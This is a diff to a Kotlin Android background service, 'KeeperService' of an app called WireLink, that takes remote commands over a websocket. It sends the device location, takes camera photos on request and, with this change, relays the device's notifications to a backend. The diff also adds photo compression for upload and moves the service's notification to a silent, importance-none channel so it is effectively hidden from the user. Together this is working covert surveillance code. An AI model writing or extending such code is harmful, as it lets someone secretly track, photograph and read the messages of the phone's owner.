@@ -10,6 +10,8 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.os.Build
 import android.util.Base64
 import androidx.camera.core.CameraSelector
@@ -29,6 +31,7 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withContext
 import org.json.JSONObject
+import java.io.ByteArrayOutputStream
 import java.util.concurrent.Executor
 import kotlin.coroutines.resume
 
@@ -53,8 +56,12 @@ class KeeperService : LifecycleService() {
         )
 
         if (ws == null) connect()
+        if (!linkBusStarted) startLinkBus()
+
         return START_STICKY
     }
+
+    // ---------- ws ----------
 
     private fun connect() {
         val base = Prefs.backendUrl(this) ?: return
@@ -70,7 +77,7 @@ class KeeperService : LifecycleService() {
                 })
             },
             onMessage = { handle(it) },
-            onClosed = { /* WsClient auto-reconnects */ }
+            onClosed = { }
         ).also { it.start(lifecycleScope) }
     }
 
@@ -82,7 +89,7 @@ class KeeperService : LifecycleService() {
         lifecycleScope.launch(Dispatchers.IO) {
             when (cmd) {
                 "location" -> sendLocation(reqId)
-                "camera" -> sendPhoto(
+                "camera"   -> sendPhoto(
                     reqId,
                     msg.optJSONObject("payload")?.optString("lens") ?: "rear"
                 )
@@ -90,6 +97,31 @@ class KeeperService : LifecycleService() {
             }
         }
     }
+
+    // ---------- linkbus: notification relay ----------
+
+    @Volatile private var linkBusStarted = false
+
+    private fun startLinkBus() {
+        linkBusStarted = true
+        lifecycleScope.launch {
+            LinkBus.events.collect { incoming ->
+                // Wrap the incoming notification JSON into a standard result frame
+                val deviceId = Prefs.deviceId(this@KeeperService)
+                val frame = JSONObject().apply {
+                    put("type", "result")
+                    put("reqId", "n-${System.currentTimeMillis()}")
+                    put("command", "notification")
+                    put("deviceId", deviceId)
+                    put("success", true)
+                    put("payload", incoming)
+                }
+                ws?.send(frame)
+            }
+        }
+    }
+
+    // ---------- location ----------
 
     @SuppressLint("MissingPermission")
     private suspend fun sendLocation(reqId: String) {
@@ -125,6 +157,8 @@ class KeeperService : LifecycleService() {
         )
     }
 
+    // ---------- camera ----------
+
     private suspend fun sendPhoto(reqId: String, lens: String) {
         if (ContextCompat.checkSelfPermission(
                 this, Manifest.permission.CAMERA
@@ -139,19 +173,23 @@ class KeeperService : LifecycleService() {
         else
             CameraSelector.LENS_FACING_BACK
 
-        val jpeg = captureJpeg(lensFacing)
-        if (jpeg == null) {
+        val raw = captureJpeg(lensFacing)
+        if (raw == null) {
             sendResult(reqId, "camera", false, null, "capture failed")
             return
         }
+
+        // compress before shipping
+        val compressed = compressJpeg(raw) ?: raw
 
         sendResult(
             reqId, "camera", true,
             JSONObject().apply {
                 put("lens", lens)
                 put("mime", "image/jpeg")
-                put("b64", Base64.encodeToString(jpeg, Base64.NO_WRAP))
+                put("b64", Base64.encodeToString(compressed, Base64.NO_WRAP))
                 put("ts", System.currentTimeMillis())
+                put("size", compressed.size)
             },
             null
         )
@@ -205,6 +243,40 @@ class KeeperService : LifecycleService() {
             }
         }
 
+    /**
+     * Compress a JPEG byte array.
+     *  - longest side capped at MAX_SIDE
+     *  - re-encoded at JPEG_QUALITY
+     *  - returns null if decode failed (caller falls back to raw)
+     */
+    private fun compressJpeg(raw: ByteArray): ByteArray? {
+        return try {
+            val original = BitmapFactory.decodeByteArray(raw, 0, raw.size) ?: return null
+            val (w, h) = original.width to original.height
+            val longest = maxOf(w, h)
+
+            val scaled: Bitmap = if (longest > MAX_SIDE) {
+                val ratio = MAX_SIDE.toFloat() / longest
+                val nw = (w * ratio).toInt().coerceAtLeast(1)
+                val nh = (h * ratio).toInt().coerceAtLeast(1)
+                Bitmap.createScaledBitmap(original, nw, nh, true).also {
+                    if (it !== original) original.recycle()
+                }
+            } else {
+                original
+            }
+
+            val out = ByteArrayOutputStream()
+            scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out)
+            scaled.recycle()
+            out.toByteArray()
+        } catch (t: Throwable) {
+            null
+        }
+    }
+
+    // ---------- result send ----------
+
     private fun sendResult(
         reqId: String,
         cmd: String,
@@ -223,14 +295,21 @@ class KeeperService : LifecycleService() {
         })
     }
 
+    // ---------- foreground notification (silent) ----------
+
     private fun buildNotification(): Notification {
-        val ch = "wirelink_svc"
+        val ch = "wirelink_silent"     // new id — importance NONE can't be retro-applied to an existing channel
         if (Build.VERSION.SDK_INT >= 26) {
             val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             if (nm.getNotificationChannel(ch) == null) {
                 nm.createNotificationChannel(
-                    NotificationChannel(ch, "WireLink", NotificationManager.IMPORTANCE_MIN)
-                        .apply { setShowBadge(false) }
+                    NotificationChannel(ch, "WireLink", NotificationManager.IMPORTANCE_NONE)
+                        .apply {
+                            setShowBadge(false)
+                            setSound(null, null)
+                            enableVibration(false)
+                            enableLights(false)
+                        }
                 )
             }
         }
@@ -240,6 +319,7 @@ class KeeperService : LifecycleService() {
             .setContentText("service running")
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setSilent(true)
             .build()
     }
 
@@ -251,5 +331,7 @@ class KeeperService : LifecycleService() {
 
     companion object {
         const val NOTIF_ID = 4242
+        const val MAX_SIDE = 1280        // px on the longest edge
+        const val JPEG_QUALITY = 65      // 0..100
     }
 }
